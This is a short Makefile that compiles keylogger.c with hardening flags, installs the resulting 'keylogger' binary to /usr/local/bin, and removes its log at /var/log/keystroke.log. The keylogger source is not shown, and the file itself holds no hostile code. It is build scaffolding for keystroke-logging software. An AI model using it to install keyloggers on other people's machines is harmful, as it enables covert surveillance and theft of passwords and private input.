CC=gcc
CFLAGS=-fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 
LDFLAGS=-Wl,-z,relro,-z,now
SOURCES=keylogger.c
EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin
DEPENDENCIES=define.h functions.h

install:$(SOURCES) $(DEPENDENCIES)
	@$(CC) $(SOURCES) $(CFLAGS) $(LDFLAGS) -o $(EXECUTABLE)
	@mv $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	@rm $(INSTALLDIR)/$(EXECUTABLE)
	
remove:
	@rm /var/log/keystroke.log
